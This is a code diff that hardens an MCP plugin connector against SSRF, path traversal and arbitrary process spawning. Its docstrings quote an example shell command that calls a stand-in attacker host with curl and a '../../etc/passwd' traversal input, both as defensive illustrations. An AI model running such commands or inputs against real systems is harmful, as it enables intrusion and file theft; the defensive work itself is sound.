@@ -234,6 +234,71 @@ class _McpConnectionConfig:
     auth_headers: Optional[Dict[str, str]] = field(default_factory=dict)
 
 
+def _validate_network_url(url: str, transport_label: str) -> None:
+    """Block SSRF targets (cloud metadata, link-local) for network-based transports.
+
+    Delegates to the project-wide validate_plugin_url() which already covers
+    169.254.x.x, fd00:ec2::, metadata.google.internal, etc.
+    Raises ValueError with a descriptive message on rejection.
+    """
+    try:
+        validate_plugin_url(url)
+    except ValueError as exc:
+        raise ValueError(f"MCP {transport_label} URL rejected: {exc}") from exc
+
+
+def _validate_openapi_paths(url: str) -> None:
+    """Prevent path-traversal for OPENAPI transport.
+
+    OpenApiClient accepts a comma-separated list of local file paths. Without
+    validation a user could supply '../../etc/passwd' and have the server read
+    arbitrary files. This function resolves every path and asserts it stays
+    inside the application working directory.
+
+    Raises ValueError if any path escapes the safe root.
+    """
+    safe_root = Path(os.getcwd()).resolve()
+    for raw in url.split(","):
+        raw = raw.strip()
+        if not raw:
+            continue
+        resolved = Path(raw).expanduser().resolve()
+        try:
+            resolved.relative_to(safe_root)
+        except ValueError as exc:
+            raise ValueError(
+                f"OPENAPI spec path '{raw}' resolves to '{resolved}', which is "
+                f"outside the permitted directory '{safe_root}'. "
+                "Absolute paths outside the working directory are not allowed."
+            ) from exc
+
+
+def _build_safe_stdio_params(config: "_McpConnectionConfig") -> dict:
+    """Build STDIO subprocess parameters with server-controlled fixed values.
+
+    Security: command, args, env, and cwd are NOT taken from user-supplied
+    config.params. Allowing untrusted input to control these fields would let
+    an attacker spawn arbitrary processes (e.g. command="/bin/sh",
+    args=["-c", "curl http://attacker/pwned"]).
+
+    Only encoding_error_handler is read from user input, and it is validated
+    against an explicit allowlist before use.
+    """
+    _valid_handlers = {"strict", "ignore", "replace"}
+    raw_params = dict(config.params or {})
+    handler = raw_params.get("encoding_error_handler", "strict")
+    if handler not in _valid_handlers:
+        handler = "strict"
+
+    return {
+        "command": sys.executable,
+        "args": [config.url],
+        "env": None,
+        "cwd": os.getcwd(),
+        "encoding_error_handler": handler,
+    }
+
+
 async def _discover_and_create_mcp_tools(
         config: _McpConnectionConfig,
         plugin_id: str,
@@ -270,13 +335,33 @@ async def _discover_and_create_mcp_tools(
             message=f"Unsupported MCP transport value: {config.transport}",
         )
 
-    mcp_params = dict(config.params or {})
+    # --- Security: validate config.url before any network or file I/O ---
+    _network_transports = {
+        PluginMcpTransport.PLUGIN_MCP_TRANSPORT_SSE,
+        PluginMcpTransport.PLUGIN_MCP_TRANSPORT_STREAMABLE_HTTP,
+        PluginMcpTransport.PLUGIN_MCP_TRANSPORT_PLAYWRIGHT,
+    }
+    if mcp_transport_enum in _network_transports:
+        try:
+            _validate_network_url(config.url or "", transport_label=client_type)
+        except ValueError as exc:
+            return ResponseModel(
+                code=status.HTTP_400_BAD_REQUEST,
+                message=str(exc),
+            )
+    elif mcp_transport_enum == PluginMcpTransport.PLUGIN_MCP_TRANSPORT_OPENAPI:
+        try:
+            _validate_openapi_paths(config.url or "")
+        except ValueError as exc:
+            return ResponseModel(
+                code=status.HTTP_400_BAD_REQUEST,
+                message=str(exc),
+            )
+
     if mcp_transport_enum == PluginMcpTransport.PLUGIN_MCP_TRANSPORT_STDIO:
-        mcp_params.setdefault("command", sys.executable)
-        mcp_params.setdefault("args", [config.url])
-        mcp_params.setdefault("env", None)
-        mcp_params.setdefault("cwd", os.getcwd())
-        mcp_params.setdefault("encoding_error_handler", "strict")
+        mcp_params = _build_safe_stdio_params(config)
+    else:
+        mcp_params = dict(config.params or {})
 
     server_config = McpServerConfig(
         server_name=server_name,
